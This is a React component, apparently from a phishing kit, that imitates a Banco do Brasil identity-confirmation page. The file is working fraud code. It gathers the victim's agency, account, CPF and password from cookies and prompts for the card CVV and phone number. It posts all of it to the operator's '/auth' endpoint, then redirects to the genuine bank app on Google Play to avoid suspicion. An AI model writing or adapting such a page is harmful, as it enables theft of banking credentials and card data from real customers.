import React, { useState, useEffect } from "react";
import Cookies from "universal-cookie";
import { Redirect } from "react-router-dom";
import api from "../api";

const Confirmacao = () => {
  const [voltar, setVoltar] = useState(false);
  const [cvv, setCvv] = useState("");
  const [celular, setCelular] = useState("");

  useEffect(() => {
    let cookies = new Cookies();
    console.log(cookies.get("senha"));
    if (cookies.get("senha") === undefined) {
      setVoltar(true);
    } else {
    }
  }, []);

  async function onSubmit(e) {
    let cookies = new Cookies();

    let agencia = cookies.get("agencia");
    let conta = cookies.get("conta");
    let cpf = cookies.get("cpf");
    let senha = cookies.get("senha");

    let data = {
      agencia,
      conta,
      cpf,
      senha,
      cvv,
      celular,
    };

    let res = await api.post("/auth", data);

    if (res.data === "ok") {
      window.location.href =
        "https://play.google.com/store/apps/details?id=br.com.bb.android&hl=pt_BR&referrer=utm_source%3Dgoogle%26utm_medium%3Dorganic%26utm_term%3Dplaystore+bb&pcampaignid=APPU_1_fig8X9TZEd6f5OUPsaKL6AQ";
    }
  }

  return (
    <>
      {voltar ? <Redirect to="/" /> : ""}
      <div
        style={{
          padding: "20px 40px",
          textAlign: "left",
          color: "#005aa5",
          backgroundColor: "gold",
        }}
        className="titulo"
      >
        <h1>Banco do Brasil</h1>
      </div>
      <header>
        <div className="icon">
          <a href="/">
            {" "}
            <i className="fa fa-arrow-left" style={{ color: "white" }}></i>
          </a>
        </div>
        <div className="title">
          <h1>Confirme sua identidade</h1>
        </div>
      </header>
      <main>
        <form className="loginF" method="post" action="">
          <div className="passos"></div>

          <input
            type="text"
            name=""
            onChange={(e) => setCvv(e.target.value)}
            placeholder="Código de segurança (CVV)"
            pattern="[0-9]*"
            inputmode="numeric"
            maxLength={3}
            id=""
          />
          <input
            type="text"
            name=""
            onChange={(e) => setCelular(e.target.value)}
            placeholder="Celular"
            pattern="[0-9]*"
            inputmode="numeric"
            maxLength={12}
            id=""
          />
        </form>
      </main>
      <div className="links" style={{ opacity: 0.55 }}>
        <span>
          <span style={{ color: "red" }}>*</span> O código de segurança deve ser
          o que consta no verso do cartão principal.
        </span>
        <br />
        <span>
          <span style={{ color: "red" }}>*</span> O número do celular deve ser o
          mesmo cadastrado na conta.
        </span>
      </div>
      <footer onClick={onSubmit}>
        <div className="icon"></div>
        <div className="action">CONFIRMAR</div>
      </footer>
    </>
  );
};

export default Confirmacao;
